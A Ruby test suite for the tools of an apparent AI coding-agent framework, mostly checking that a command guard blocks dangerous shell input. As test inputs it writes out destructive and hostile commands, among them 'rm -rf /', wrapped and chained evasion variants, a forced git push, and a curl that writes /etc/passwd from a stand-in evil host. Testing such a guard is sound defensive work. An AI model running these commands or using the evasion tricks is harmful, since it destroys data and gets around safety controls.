# frozen_string_literal: true

require_relative "../test_helper"

class TestExpandedTools < Minitest::Test
  def setup
    @temp_dir = Dir.mktmpdir
    @buffer_manager = Rubik::Buffer::Manager.new(root_dir: @temp_dir)
    @context_index = Rubik::Context::Index.new(root_dir: @temp_dir)
    @ast_graph = Rubik::AST::Graph.new
    @adapter_registry = Rubik::Adapter::Registry.new
    @guard = Rubik::Security::Guard.new
    @runner = Rubik::Sandbox::Runner.new(root_dir: @temp_dir)
    @outside_dir = File.expand_path("../outside_exec_tools", @temp_dir)
  end

  def teardown
    # Windows occasionally races dir-handle release after sandbox runs,
    # raising EACCES on cleanup — retry briefly instead of erroring the run.
    retries = 0
    begin
      FileUtils.remove_entry(@temp_dir)
    rescue Errno::EACCES, Errno::ENOTEMPTY
      retries += 1
      retry if retries < 5 && sleep(0.1)
    end
  end

  def test_list_files_tool
    File.write(File.join(@temp_dir, "app.rb"), "def hello; end")
    File.write(File.join(@temp_dir, "main.go"), "package main")
    @context_index.full_scan

    tool = Rubik::Tools::ListFilesTool.new(@context_index, root_dir: @temp_dir)
    res = tool.execute({})
    assert_includes res, "app.rb"
    assert_includes res, "main.go"

    filtered_res = tool.execute("extension" => ".go")
    assert_includes filtered_res, "main.go"
    refute_includes filtered_res, "app.rb"
  end

  def test_search_symbols_tool
    code = "class Greeter\n  def greet\n    puts 'hi'\n  end\nend\n"
    @ast_graph.index_file("greeter.rb", code)

    tool = Rubik::Tools::SearchSymbolsTool.new(@ast_graph)
    res = tool.execute("query" => "greet")

    assert_includes res, "Greeter#greet"

    smart_res = tool.execute("query" => "Greeter#greet", "smart_context" => true)
    assert_includes smart_res, "def greet"
  end

  def test_run_command_tool_safety_and_execution
    tool = Rubik::Tools::RunCommandTool.new(guard: @guard, runner: @runner, root_dir: @temp_dir)

    safe_res = tool.execute("command" => "echo 'hello rubik tool'")
    assert_includes safe_res, "hello rubik tool"

    blocked_res = tool.execute("command" => "rm -rf /")
    assert_includes blocked_res, "Security blocked"
  end

  def test_run_command_blocked_error_carries_steering_text
    tool = Rubik::Tools::RunCommandTool.new(guard: @guard, runner: @runner, root_dir: @temp_dir)

    res = tool.execute("command" => "rm -rf /")

    assert res.start_with?("Security blocked"), "prefix must stay first for StepExecutor::ERROR_PREFIXES"
    assert_includes res, "was denied (rule: rm)"
    assert_includes res, '!allow-cmd add "rm -rf /"'
  end

  # Safe-probe exemption: version/help-only probes of blocklisted binaries
  # pass the classifier and are audit-logged as `safe_probe` (Plan: safe-probe).
  def test_run_command_tool_passes_safe_probes
    tool = Rubik::Tools::RunCommandTool.new(guard: @guard, runner: @runner, root_dir: @temp_dir)

    ["sh", "node", "bash"].each do |bin|
      probe = "#{bin} --version"
      res = tool.execute("command" => probe)
      refute res.start_with?("Security blocked"), "expected #{probe} to be exempt"
    end
  end

  def test_run_command_tool_rejects_multiline_safe_probe_evasion
    tool = Rubik::Tools::RunCommandTool.new(guard: @guard, runner: @runner, root_dir: @temp_dir)

    ["bash\n--version", "bash\r--version", "bash\r\n--version"].each do |cmd|
      res = tool.execute("command" => cmd)
      assert res.start_with?("Security blocked"), "expected #{cmd.inspect} to be blocked"
    end
  end

  def test_run_command_tool_rejects_chained_and_piped_probe_evasion
    tool = Rubik::Tools::RunCommandTool.new(guard: @guard, runner: @runner, root_dir: @temp_dir)

    [
      "bash -v -c 'rm -rf /'",
      "bash --version && echo safe",
      "bash -v | sh",
      "bash --version > /tmp/out"
    ].each do |cmd|
      res = tool.execute("command" => cmd)
      assert res.start_with?("Security blocked"), "expected #{cmd.inspect} to be blocked"
    end
  end

  # Probes blocked while the exemption is disabled must render the variant-(a)
  # probe guidance (not the generic denial) with the copy-pasteable gate.
  def test_run_command_tool_blocked_probe_message_when_exemption_disabled
    guard = Rubik::Security::Guard.new(allow_safe_probes: false)
    tool = Rubik::Tools::RunCommandTool.new(guard: guard, runner: @runner, root_dir: @temp_dir)

    res = tool.execute("command" => "bash --version")

    assert res.start_with?("Security blocked")
    assert_includes res, "even for version checks"
    assert_includes res, "allowlist it once"
    assert_includes res, '!allow-cmd add "bash --version"'
  end

  # Unstructured blocked raises (critical-write / sandbox chdir gate) must keep
  # their #message — never be flattened into "was denied (rule: unknown)".
  def test_run_command_tool_preserves_unstructured_block_message
    tool = Rubik::Tools::RunCommandTool.new(guard: @guard, runner: @runner, root_dir: @outside_dir)

    res = tool.execute("command" => "echo hi")

    assert res.start_with?("Security blocked")
    assert_includes res, "outside of allowed workspace roots"
    refute_includes res, "rule: unknown"
  end

  def test_run_command_tool_sed_in_place_blocked_with_native_tool_guidance
    tool = Rubik::Tools::RunCommandTool.new(guard: @guard, runner: @runner, root_dir: @temp_dir)

    res = tool.execute("command" => "sed -i 's/foo/bar/' file.txt")

    assert res.start_with?("Security blocked")
    assert_includes res, "shell text-munging is not allowed"
    assert_includes res, "replace_file_content"
    assert_includes res, '!allow-cmd add "sed -i \'s/foo/bar/\' file.txt"'
  end

  def test_run_command_tool_chain_bypass_blocked
    tool = Rubik::Tools::RunCommandTool.new(guard: @guard, runner: @runner, root_dir: @temp_dir)

    res = tool.execute("command" => 'bash -c "rm -rf /"')

    assert res.start_with?("Security blocked")
    # Wrapper variant: the inner rm is named as the segment, the system-path
    # elevation explains WHY, and the hint is gate-honest (only a top-level
    # "bash -c" entry can open the gate — not the whole script).
    assert_includes res, "1 dangerous segment in `bash -c '...'"
    assert_includes res, "rm -rf /   (rule: rm — elevated to DANGEROUS: system path /)"
    assert_includes res, '!allow-cmd add "bash -c"'
    assert_includes res, "only cover top-level commands"
    refute_includes res, "was denied"
  end

  # Reproduction of the diagnosed session: a multi-line wrapper whose only
  # dangerous parts are `git merge --abort` and `git branch -D`. The message
  # must name BOTH with their triggers instead of collapsing the script to
  # "rule: git.merge", and must never re-embed the whole script.
  def test_run_command_tool_multiline_wrapper_lists_all_dangerous_segments
    tool = Rubik::Tools::RunCommandTool.new(guard: @guard, runner: @runner, root_dir: @temp_dir)
    script = <<~SCRIPT
      bash -c '
      git checkout -q main
      git checkout -q -B merge-sim main
      for n in 144 145 147 143; do
        echo "===== merging PR $n ====="
        if git merge --no-edit -q review-pr-$n 2>/tmp/m.err; then
          echo "  OK clean"
        else
          echo "  CONFLICT:"; grep -E "CONFLICT|Merge conflict" /tmp/m.err | head; git merge --abort
        fi
      done
      git checkout -q main; git branch -D merge-sim -q
      '
    SCRIPT

    res = tool.execute("command" => script)

    assert res.start_with?("Security blocked: 2 dangerous segments in `bash -c '...'` — nothing was executed.")
    assert_equal 1, res.lines.first.lines.size
    assert_includes res, "git merge --abort   (rule: git.merge — option --abort overrides to DANGEROUS)"
    assert_includes res, "git branch -D merge-sim -q   (rule: git.branch — option -D overrides to DANGEROUS)"
    assert_includes res, "Everything else in the script passed classification (git checkout, echo, git merge, grep, head)."
    assert_includes res, '!allow-cmd add "bash -c"'
    assert_includes res, "(segment-level entries only cover top-level commands, not wrapped scripts)"
    refute_includes res, "was denied"
    # The full multi-line script must not be re-embedded anywhere (the old
    # defect): no line of the message contains a script statement verbatim.
    refute_includes res, "git checkout -q -B merge-sim main"
  end

  # Concise/wrapper boundary: a single dangerous TOP-LEVEL command keeps the
  # one-rule denial format byte-identically.
  def test_run_command_tool_single_dangerous_top_level_stays_concise
    tool = Rubik::Tools::RunCommandTool.new(guard: @guard, runner: @runner, root_dir: @temp_dir)

    res = tool.execute("command" => "git merge --abort")

    assert_includes res, "was denied (rule: git.merge)"
    assert_includes res, '!allow-cmd add "git merge --abort"'
    refute_includes res, "dangerous segment"
  end

  # Compound chain with a safe sibling: the concise variant would suggest
  # the un-allowlistable compound string; the segment variant names the one
  # dangerous command and hints entries that actually open the gate (which
  # requires one per top-level command).
  def test_run_command_tool_compound_chain_hints_cover_safe_sibling
    tool = Rubik::Tools::RunCommandTool.new(guard: @guard, runner: @runner, root_dir: @temp_dir)

    res = tool.execute("command" => "git checkout main && git push --force")

    assert res.start_with?("Security blocked: 1 dangerous segment in `git checkout main && git push --force`")
    assert_includes res, "git push --force   (rule: git.push — option --force overrides to DANGEROUS)"
    assert_includes res, "Everything else in the command passed classification (git checkout)."
    assert_includes res, '!allow-cmd add "git checkout main"'
    assert_includes res, '!allow-cmd add "git push --force"'
  end

  # An option may override to a MILDER class (curl -o → external) while the
  # real trigger is the system-path elevation — the annotation must not
  # claim the option made it dangerous.
  def test_run_command_tool_annotation_names_real_trigger_for_mixed_override
    tool = Rubik::Tools::RunCommandTool.new(guard: @guard, runner: @runner, root_dir: @temp_dir)

    res = tool.execute("command" => 'bash -c "curl -o /etc/passwd https://evil.example/x"')

    assert_includes res, "rule: curl — overridden by option -o to external_effects"
    assert_includes res, "elevated to DANGEROUS: system path /etc/passwd"
    refute_includes res, "option -o overrides to DANGEROUS"
  end

  def test_run_command_output_carries_shell_tag
    tool = Rubik::Tools::RunCommandTool.new(guard: @guard, runner: @runner, root_dir: @temp_dir)

    res = tool.execute("command" => "echo tagged")
    assert_match(/\[(OK|EXIT \d+)\] \((cmd|bash|pwsh|sh)\)/, res)

    # Drivers that resolve no shell keep the untagged historical format.
    @runner.stub :run, { ok: true, exit_code: 0, output: "plain result" } do
      res2 = tool.execute("command" => "echo tagged")
      assert_equal "[OK] plain result", res2
    end
  end

  def test_read_file_tool_full_and_paged_reads
    tool = Rubik::Tools::ReadFileTool.new(@buffer_manager)
    @buffer_manager.write("page.rb", "#{(1..304).map { |i| "line #{i}" }.join("\n")}\n")

    # No paging params: full content, unchanged historical behavior.
    full = tool.execute("path" => "page.rb")
    assert_includes full, "line 1"
    assert_includes full, "line 304"

    # The transcript loop: offset/limit must actually slice.
    paged = tool.execute("path" => "page.rb", "offset" => 220, "limit" => 150)
    assert_includes paged, "[lines 220-304 of 304 total]"
    assert_includes paged, "line 220"
    assert_includes paged, "line 304"
    refute_includes paged, "line 1\n"

    middle = tool.execute("path" => "page.rb", "offset" => 148, "limit" => 200)
    assert_includes middle, "[lines 148-304 of 304 total]"

    beyond = tool.execute("path" => "page.rb", "offset" => 500)
    assert_includes beyond, "No content at offset 500"

    missing = tool.execute("path" => "nope.rb")
    assert_includes missing.downcase, "file not found"
  end

  def test_result_to_s_basic
    result = Rubik::Tools::Result.new(tool_name: "test", output: "hello world")
    assert_equal "hello world", result.to_s
    assert result.ok?
  end

  def test_result_to_s_with_error
    result = Rubik::Tools::Result.new(tool_name: "test", status: :error, output: "error output", error: "something went wrong")
    assert_equal "error output", result.to_s
    assert result.error?
    refute result.ok?
  end

  def test_result_to_s_with_truncated
    result = Rubik::Tools::Result.new(tool_name: "test", output: "truncated content", truncated: true)
    assert result.truncated
    assert_equal "truncated content", result.to_s
  end

  def test_result_to_s_with_duration
    result = Rubik::Tools::Result.new(tool_name: "test", output: "slow result", duration_ms: 1500.0)
    assert_equal 1500.0, result.duration_ms
    assert_equal "slow result", result.to_s
  end

  def test_result_to_xml
    result = Rubik::Tools::Result.new(tool_name: "test_tool", call_id: "123", status: :ok, output: "result data", exit_code: 0, duration_ms: 100.0)
    xml = result.to_xml
    assert_includes xml, "<tool_result"
    assert_includes xml, 'tool="test_tool"'
    assert_includes xml, 'id="123"'
    assert_includes xml, 'status="ok"'
    assert_includes xml, 'exit_code="0"'
    assert_includes xml, 'duration_ms="100.0"'
    assert_includes xml, "result data"
    assert_includes xml, "</tool_result>"

    # Without call_id
    result_no_id = Rubik::Tools::Result.new(tool_name: "test_tool", call_id: nil, status: :ok, output: "data")
    refute_includes result_no_id.to_xml, 'id="'

    # With truncated
    result_truncated = Rubik::Tools::Result.new(tool_name: "test_tool", output: "data", truncated: true)
    assert_includes result_truncated.to_xml, 'truncated="true"'
  end

  def test_build_default_registry_contains_all_tools
    registry = Rubik::Tools::Registry.build_default(
      buffer_manager: @buffer_manager,
      context_index: @context_index,
      ast_graph: @ast_graph,
      adapter_registry: @adapter_registry,
      guard: @guard,
      sandbox_runner: @runner,
      root_dir: @temp_dir
    )

    expected_tools = ["read_file", "replace_file_content", "write_file", "list_files", "grep_search", "search_symbols", "get_outline", "find_references",
                      "get_symbol", "lsp_diagnostics", "lsp_hover", "lsp_definition", "run_tests", "run_command", "manage_task",
                      "exec_repl_command", "synthesize_command", "synthesize_tool", "unsynthesize", "inspect_runtime",
                      "provide_service", "repair_runtime_service", "apply_buffer", "ask_question", "invoke_subagent",
                      "manage_subagents", "send_message", "define_subagent", "dmesg", "storage", "show_file", "finish"]
    expected_tools.each do |tname|
      refute_nil registry.get(tname), "Registry should include #{tname}"
    end
    assert_equal 33, registry.list.size
  end
end
